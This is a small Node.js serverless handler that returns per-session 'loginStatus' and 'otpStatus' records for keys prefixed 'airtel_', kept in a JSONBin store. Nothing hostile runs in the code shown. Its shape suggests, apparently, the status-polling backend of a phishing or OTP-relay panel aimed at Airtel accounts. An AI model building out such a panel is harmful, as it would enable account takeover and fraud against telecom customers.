const { default: axios } = require('axios');

// In-memory state with JSONBin persistence
const sessionState = new Map();
const JSONBIN_KEY = process.env.JSONBIN_KEY || '';
const JSONBIN_ID = process.env.JSONBIN_ID || '';

// Load from JSONBin on startup
async function loadState() {
  if (JSONBIN_KEY && JSONBIN_ID) {
    try {
      const res = await axios.get(`https://api.jsonbin.io/v3/b/${JSONBIN_ID}/latest`, {
        headers: { 'X-Master-Key': JSONBIN_KEY, 'X-Bin-Meta': 'false' }
      });
      if (res.data) {
        Object.entries(res.data).forEach(([key, value]) => {
          if (key.startsWith('airtel_')) {
            sessionState.set(key, value);
          }
        });
        console.log('[get-status] Loaded state from JSONBin:', sessionState.size, 'sessions');
      }
    } catch (e) {
      console.warn('[get-status] Failed to load from JSONBin:', e.message);
    }
  }
}

loadState();

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Cache-Control', 'no-store, no-cache');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'GET') return res.status(405).json({ error: 'Method Not Allowed' });

  try {
    const { sessionId } = req.query || {};
    if (!sessionId) return res.status(400).json({ error: 'sessionId required' });

    const key = `airtel_${sessionId}`;
    const status = sessionState.get(key) || {
      loginStatus: 'pending',
      otpStatus: 'idle',
      lastUpdated: Date.now(),
    };

    return res.status(200).json(status);
  } catch (error) {
    console.error('[get-status] Error:', error);
    return res.status(500).json({ error: error.message });
  }
}
